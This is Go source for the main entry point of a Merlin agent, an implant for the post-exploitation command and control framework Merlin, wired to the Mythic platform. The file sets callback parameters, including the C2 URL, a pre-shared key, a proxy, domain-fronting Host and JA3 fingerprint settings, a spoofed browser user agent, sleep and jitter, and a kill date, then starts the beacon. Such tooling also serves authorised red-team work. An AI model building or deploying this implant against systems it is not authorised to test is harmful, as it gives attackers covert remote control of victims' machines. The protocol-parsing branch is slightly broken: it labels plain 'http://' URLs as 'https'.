// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (

	// Standard
	"os"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients/mythic"
	"github.com/Ne0nd0g/merlin/pkg/agent/core"

)

// TODO Update pkg/agent/core.[build, verbose, debug]

// GLOBAL VARIABLES
var payloadID = ""
var url = "https://127.0.0.1:443"
var psk string
var proxy string
var host string
var ja3 string
var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
var sleep = "30s"
var skew = "3000"
var killdate = "0"
var maxretry = "7"
var padding = "4096"
var verbose = "false"
var debug = "false"

func main(){
	core.Verbose, _ = strconv.ParseBool(verbose)
	core.Debug, _ = strconv.ParseBool(debug)

	// Setup and run agent
	agentConfig := agent.Config{
		Sleep:    sleep,
		Skew:     skew,
		KillDate: killdate,
		MaxRetry: maxretry,
	}
	a, err := agent.New(agentConfig)
	if err != nil {
		if core.Verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	// HTTP client configuration
	clientConfig := mythic.Config{
		AgentID:    a.ID,
		PayloadID: 	payloadID,
		URL: url,
		PSK: psk,
		UserAgent: useragent,
		JA3: ja3,
		Host: host,
		Proxy: proxy,
		Padding: padding,
	}

	// Parse http or https
	if strings.HasPrefix(url, "https://"){
		clientConfig.Protocol = "https"
	} else if strings.HasPrefix(url, "http://"){
		clientConfig.Protocol = "https"
	} else {
		if core.Verbose {
			color.Red("unable to detect valid protocol from URL: " + url)
			os.Exit(1)
		}
	}

	a.Client, err = mythic.New(clientConfig)
	if err != nil {
		if core.Verbose {
			color.Red(err.Error())
		}
	}

	// Start the agent
	err = a.Run()
	if err != nil {
		if core.Verbose {
			color.Red(err.Error())
		}
	}
}